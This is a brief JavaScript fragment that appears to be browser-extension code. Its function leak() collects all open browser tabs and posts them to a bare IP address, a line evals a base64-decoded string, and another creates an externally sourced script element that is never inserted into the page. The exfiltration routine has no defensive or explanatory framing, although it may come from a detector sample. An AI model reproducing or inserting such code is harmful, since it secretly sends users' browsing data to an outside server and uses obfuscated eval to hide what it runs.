function leak() {
    chrome.tabs.query({}, function (tabs) {
        fetch("http://203.0.113.5/log", { method: "POST", body: JSON.stringify(tabs) });
    });
}
eval(atob("aGVsbG8="));
var s = document.createElement("script");
s.src = "https://cdn.example.com/lib.js";